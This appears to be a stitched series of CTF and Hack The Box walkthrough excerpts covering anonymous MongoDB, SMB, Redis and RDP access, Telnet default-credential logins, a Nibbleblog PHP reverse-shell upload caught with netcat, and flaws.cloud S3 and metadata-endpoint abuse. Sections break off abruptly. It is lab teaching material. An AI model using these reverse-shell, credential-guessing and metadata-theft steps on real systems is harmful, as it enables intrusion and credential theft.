In most environments, database systems are very important because they communicate information related to your sales transactions, product inventory, customer profiles and marketing activities. There are different types of databases and one among them is MongoDB, which is a document-oriented NoSQL database. It is crucial to be aware of how the data is stored in different types of databases and how we can connect to these remote database servers and retrieve the desired data. In a document-oriented NoSQL database, the data is organized into a hierarchy of the following levels:\ndatabases collections documents Databases make up the top level of data organization in a MongoDB instance. Databases are organized into collections which contain documents. Documents contain literal data such as strings, numbers, dates, etc. in a JSON-like format. It often happens that the database server is misconfigured to permit anonymous login which can be exploited by an attacker to get access to sensitive information stored on the database. Mongod is a Linux box that features a MongoDB server running on it which allows anonymous login without a username or\npassword. We can remotely connect to this MongoDB server using the mongo command line utility and enumerate the database in it to retrieve the flag.\nMongoDB\nMongoDB is a document-oriented NoSQL database. Instead of using tables and rows like in traditional relational databases, MongoDB makes use of collections and documents. Each database contains collections which in turn further contain documents. Each document consists of key-value pairs which are the basic unit of data in a MongoDB database. A single collection can contain multiple documents and they are schema-less meaning that the size and content of each document can be different from each another.\nConnecting to MongoDB\nIn order to connect to the remote MongoDB server running on the target box, we will need to install the mongodb utility, which can be done on Debian-based Linux distributions (like Parrot, Kali and Ubuntu) by downloading the following tar archive file.\ncurl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz tar xvf mongodb-linux-x86_64-3.4.7.tgz cd mongodb-linux-x86_64-3.4.7/bin ./mongo mongodb://{target_IP}:27017 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 atom@atom-VirtualBox:~/tools/mongodb-linux-x86_64-3.4.7/bin$ ./mongo mongodb://10.129.151.153:27017 MongoDB shell version v3.4.7 connecting to: mongodb://10.129.151.153:27017 MongoDB server version: 3.6.8 WARNING: shell and server versions do not match Welcome to the MongoDB shell.

Nmap done: 1 IP address (1 host up) scanned in 54.45 seconds Remote access software represents a legitimate way to connect to other hosts to perform actions or offer support. The interactions involved by using any type of remote access tool can either be CLI-based Command Line Interface) or GUI-based (Graphical User Interface). These tools use the same protocol at their base to communicate with the other hosts, which is RDP . RDP (Remote Desktop Protocol) operates on ports 3389 TCP and 3389 UDP . The only difference consists of how the information relayed by this protocol is presented to the end-user.\nCLI - Remote Access Tools\nCommand Line Interface-based Remote Access Tools have been around forever. A rudimentary example of this is Telnet, which was explored briefly in the Meow machine. In its most basic configuration, Telnet is considered insecure due to lacking the ability to encrypt the data being sent through it securely. This implies that an attacker with access to a network TAP (Traffic Access Point) could easily intercept the packets being sent through a Telnet connection and read the contents, be they login credentials, sensitive files, or anything else. Telnet, which runs on port 23 TCP by default, has mainly been replaced by its more secure counterpart, SSH , running on port 22 TCP by default.\nSSH , which stands for Secure Shell Protocol, adds the required layers of authentication and encryption to the communication model, making it a much more viable approach to perform remote access and remote\nfile transfers. It is used both for patch delivery, file transfers, log transfer, and remote management in today\u0026rsquo;s environment.\nHowever, both Telnet and SSH only offer the end-user access to the remote terminal part of the host being reached. This means that no display projection comes with these tools. In order to be able to see the remote host\u0026rsquo;s display, one can resort to CLI-based tools such as xfreerdp . Tools such as this one are called Remote Desktop Tools , despite being part of the Remote Access family. The reasoning behind this is because the whole desktop can be remotely controlled by the user initiating the connection, like one would if they were physically in the room with the remote host, using its keyboard, mouse, and display to interact with it, including the ability to view graphical content, controlling the mouse pointer and keyboard input, easily interacting with the web browser, and more.\nWe can quickly check for any misconfigurations in access control by attempting to connect to this readily available port without any valid credentials, thus confirming whether the service allows guest or anonymous connections or not.\nwe will be using xfreerdp to connect from our Parrot Security virtual machine. to target machine. If you need to install xfreerdp, you can proceed with the following command: sudo apt-get install freerdp2-x11\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 atom@atom-VirtualBox:~/htb/explotion$ sudo apt install freerdp2-x11 [sudo] password for atom: Reading package lists...

The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives to provide consistency\nRedis runs as server-side software so its core functionality is in its server component. The server listens for connections from clients, programmatically or through the command-line interface. The database is stored in the server\u0026rsquo;s RAM to enable fast data access. Redis also writes the contents of the database to disk at varying intervals to persist it as a backup, in case of failure.\nIn order to work with redis you have to install redis-cli type this command to install it sudo apt install redis-tools\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 atom@atom-VirtualBox:~/htb/dancing$ sudo apt install redis-tools [sudo] password for atom: Reading package lists...

This communication protocol provides shared access to files, printers, and serial ports between endpoints on a network. We mostly see SMB services running on Windows machines.\nUsing the SMB protocol, an client application can read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request.\nAn SMB-enabled storage on the network is called a share . These can be accessed by any client that has the address of the server and the proper credentials. Like many other file access protocols, SMB requires some security layers to function appropriately within a network topology. If SMB allows clients to create, edit, retrieve, and remove files on a share, there is a clear need for an authentication mechanism. At a user level, SMB clients are required to provide a username/password combination to see or interact with the contents of the SMB share.\nDespite having the ability to secure access to the share, a network administrator can sometimes make mistakes and accidentaly allow logins without any valid credentials or using either guest accounts or anonymous log-ons\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 atom@atom-VirtualBox:~/htb/dancing$ nmap -sC -sV -p 445 10.129.1.12 Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-11 23:46 IST Nmap scan report for 10.129.1.12 Host is up (0.18s latency).

[Y/n] Smbclient will attempt to connect to the remote host and check if there is any authentication required. If there is, it will ask you for a password for your local username. We should take note of this. If we do not\nspecify a specific username to smbclient when attempting to connect to the remote host, it will just use your local machine\u0026rsquo;s username. That is the one you are currently logged into your Virtual Machine with. This is because SMB authentication always requires a username, so by not giving it one explicitly to try to login with, it will just have to pass your current local username to avoid throwing an error with the protocol.\nNevertheless, let us use our local username since we do not know about any remote usernames present on the target host that we could potentially log in with. Next up, after that, we will be prompted for a password. This password is related to the username you input before. Hypothetically, if we were a legitimate remote user trying to log in to their resource, we would know our username and password and log in normally to access our share. In this case, we do not have such credentials, so what we will be trying to perform is any of the following:\nGuest authentication Anonymous authentication Any of these will result in us logging in without knowing a proper username/password combination and seeing the files stored on the share. Let us proceed to try that.

This implies that an attacker with access to a network TAP (Traffic Access Point) could easily intercept the packets being sent through a Telnet connection and read the contents, be they login credentials, sensitive files, or anything else. Telnet, which runs on port 23 TCP by default, has mainly been replaced by its more secure counterpart, SSH , running on port 22 TCP by default.\nSSH, which stands for Secure Shell Protocol, adds the required layers of authentication and encryption to the communication model, making it a much more viable approach to perform remote access and remote file transfers. It is used both for patch delivery, file transfers, log transfer, and remote management in today\u0026rsquo;s environment.\nSSH uses public-key cryptography to verify the remote host\u0026rsquo;s identity, and the communication model is based on the Client-Server architecture , as seen previously with FTP, SMB, and other services. The local host uses the server\u0026rsquo;s public key to verify its identity before establishing the encrypted tunnel connection. Once the tunnel is established, symmetric encryption methods and hashing algorithms are used to ensure the confidentiality and integrity of the data being sent over the tunnel.\nLets we try to connect Telnet port 23 using some well-known default usernames and password like ubuntu, administrator,user,root \u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 atom@atom-VirtualBox:~$ telnet 10.129.143.226 23 Trying 10.129.143.226...

The vulnerability is in the “My image” plugin that allows the upload of PHP files. So it would allow us to upload a PHP reverse shell. it is an authenticated vulnerability we need username and password to exploit. we know the username Alright, so the next steps would be:\nNavigate to the admin login page and figure out the admin credentials Navigate to the My Image plugin page and upload a PHP reverse shell As mentioned in the Proof of Concept, the admin page can be found here.\nInitial Foot Hold [http://10.10.10.75/nibbleblog/admin.php](http://10.10.10.75/nibbleblog/admin.php)\nNow we need admin credentials. When I’m presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/nibbles, nibbles/nibbles, nibbles/admin). If that doesn’t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails.\nIn this case, the common credentials admin/nibbles worked!. Next, we need to navigate to the My Image plugin. Click on Plugins \u0026gt; My image \u0026gt; Configure.\nnavigate to /usr/share/webshell/php/PHP-revershshell.php modify the code according to our needs.\nCall the payload we uploaded via browser\n1 http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌─[atom@atom-vmwarevirtualplatform]─[~] └──╼ $nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.75] 50960 Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux 21:53:12 up 4:19, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) $ whoami nibbler $ Let’s first upgrade to a better shell.

The game is about breaking into a real AWS account by exploiting badly crafted account permissions. It has 6 levels, we are going to look one by one\nlet’s start with level 1.\nLevel 1 This level is buckets of fun. See if you can find the first sub-domain.\nNeed a hint? Visit Hint 1\nflaws.cloud is hosted on AWS which we found on Scope of this ctf . when you hear a name bucket in aws it refers to s3 storage bucket,\nlet us try to find subdomain we need to know about target domain ip and DNS records we are going to use tool called nslookup\nso what is nslookup ?\nnslookup is the name of a program that lets an Internet server administrator or any computer user enter a host name (for example, \u0026ldquo;whatis.com\u0026rdquo;) and find out the corresponding IP address or domain name system ( DNS ) record. The user can also enter a command for it to do a reverse DNS lookup and find the host name for an IP address that is specified\n1 2 3 4 5 6 7 8 9 10 ubuntu@ubuntu-2204:~$ nslookup flaws.cloud Server:\t127.0.0.53 Address:\t127.0.0.53#53 Non-authoritative answer: Name:\tflaws.cloud Address: 52.218.177.66 ubuntu@ubuntu-2204:~$ nslookup 52.218.177.66 66.177.218.52.in-addr.arpa\tname = s3-website-us-west-2.amazonaws.com. we can now sure that the target domain is hosted on AWS s3 bucket and target ip belongs to s3-website-us-west-2.amazonaws.com domain\nthe web page flaws.cloud is hosted as a static website on S3 bucket in region “us-west-2”, which is region US West (Oregon). This is a great way to host a static site, similar to hosting one via github pages (our blog site is also hosted on github pages). Some interesting facts about S3 hosting: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud). Also, S3 buckets are a global name space, meaning two people cannot have buckets with the same name. The result of this is you could create a bucket named microsoft.com and microsoft would never be able host their main site via S3 hosting.\nVisiting 52.218.177.66 the ip address on web, your browser will direct you to https://aws.amazon.com/s3/ So you know flaws.cloud is hosted as an S3 bucket.\nwe can then run:\n1 2 3 4 nslookup 52.218.177.66 # Returns: # Non-authoritative answer: # 255.184.231.54.in-addr.arpa name = s3-website-us-west-2.amazonaws.com So we know it\u0026rsquo;s hosted in the AWS region us-west-2\nSide note (not useful for this game): All S3 buckets, when configured for web hosting, are given an AWS domain you can use to browse to it without setting up your own DNS. In this case, flaws.cloud can also be visited by going to http://flaws.cloud.s3-website-us-west-2.amazonaws.com/\nan AWS S3 static site, . A common misconfiguration for web servers is directory listing if it is misconfigured then unauthenticated users are granted permissions to list a bucket.

The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you\u0026#39;ll likely get back information the owner would prefer you not see. \u0026lt;h4\u0026gt;Examples of this problem\u0026lt;/h4\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;https://twitter.com/Agarri_FR\u0026#34;\u0026gt;Nicolas Grégoire\u0026lt;/a\u0026gt; discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile (\u0026lt;a href=\u0026#34;https://engineering.prezi.com/prezi-got-pwned-a-tale-of-responsible-disclosure-ccdc71bb6dd1?gi=c0ec39b6236a\u0026#34;\u0026gt;link\u0026lt;/a\u0026gt;).

Additionally, ensure that IAM roles are restricted as much as possible. \u0026lt;hr size=3 color=\u0026#34;#00d000\u0026#34; /\u0026gt; \u0026lt;h1\u0026gt;Level 6\u0026lt;/h1\u0026gt; For this final challenge, you\u0026#39;re getting a user access key that has the SecurityAudit policy attached to it.
